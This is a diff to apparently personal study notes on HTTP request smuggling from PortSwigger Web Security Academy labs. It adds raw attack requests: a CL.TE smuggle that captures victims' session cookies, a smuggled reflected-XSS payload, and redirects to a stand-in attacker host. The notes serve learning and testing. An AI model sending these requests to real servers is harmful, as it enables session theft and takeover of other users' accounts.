@@ -1249,6 +1249,10 @@ To capture more of the victim's request, you just need to increase the value of 
 > One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the & character, meaning that the content that is stored from the victim user's request will end at the first &, which might even appear in the query string 
 
 ### PRACTITIONER Lab: Exploiting HTTP request smuggling to capture other users' requests
+**Very important** lab's description:
+The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
+
+Solution:
 First we figure out if it's CL.TE or TE.CL via timing technique and later via differential responses (just to confirm what timing technique found)
 Eventually we see that there is CL.TE
 
@@ -1268,13 +1272,13 @@ Content-Length: 330
 POST /post/comment HTTP/1.1
 Host: 0a0200e004ff76a4802d80e700f80003.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 770
+Content-Length: 803
 Cookie: session=nAkpyucPUGofhOyEDpeS71aJYlgMWsgC
 
 csrf=ZFnFy70zJnQ6p2QNAKAUMkqEEBIDsQ8L&postId=6&name=ff&email=ff%40ff.com&website=http%3A%2F%2Fff.com&comment=
 ```
 
-Once a victim makes a req, their cookie is posted in a new comment
+Once a victim makes a req, their cookie is posted in a new comment. (the victim makes a req after we make 2-3 requests)
 
 ### Using HTTP request smuggling to exploit reflected XSS
 If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application. This approach is superior to normal exploitation of reflected XSS in two ways:
@@ -1297,7 +1301,90 @@ Foo: X
 The next user's request will be appended to the smuggled request, and they will receive the reflected XSS payload in the response. 
 
 ### PRACTITIONER Lab: Exploiting HTTP request smuggling to deliver reflected XSS
-TODO:
+Lab's descripntion:
+The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
+
+And we make the req:
+```bash
+GET /post?postId=2 HTTP/2
+Host: 0aee008704b2c0a581c04dd300340007.web-security-academy.net
+Cookie: session=f5h9XHkZLrStJx4ZQPHjKvlTqcnYZHZ1
+User-Agent: HERERERERERERER
+```
+
+The value of the `User-Agent` is reflected on the page:
+```bash
+<input required type="hidden" name="userAgent" value="HERERERERERERER">
+```
+
+So to solve the lab:
+```bash
+POST / HTTP/1.1
+Host: 0aee008704b2c0a581c04dd300340007.web-security-academy.net
+Cookie: session=f5h9XHkZLrStJx4ZQPHjKvlTqcnYZHZ1
+Content-Length: 79
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=9 HTTP/1.1
+User-Agent: "><script>alert(1)</script>
+Foo: X
+```
 
 ### Using HTTP request smuggling to turn an on-site redirect into an open redirect
+Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:
+```bash
+GET /home HTTP/1.1
+Host: normal-website.com
 
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example: 
+```bash
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+
+The smuggled request will trigger a redirect to the attacker's website, which will affect the next user's request that is processed by the back-end server. For example: 
+```bash
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+Here, the user's request was for a JavaScript file that was imported by a page on the web site. The attacker can fully compromise the victim user by returning their own JavaScript in the response
+
+### Turning root-relative redirects into open redirects
+In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL for the Location header, for example:
+```bash
+GET /example HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: /example/
+```
+
+This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path:
+```bash
+GET //attacker-website.com/example HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: //attacker-website.com/example/
+```
+
+### Using HTTP request smuggling to perform web cache poisoning
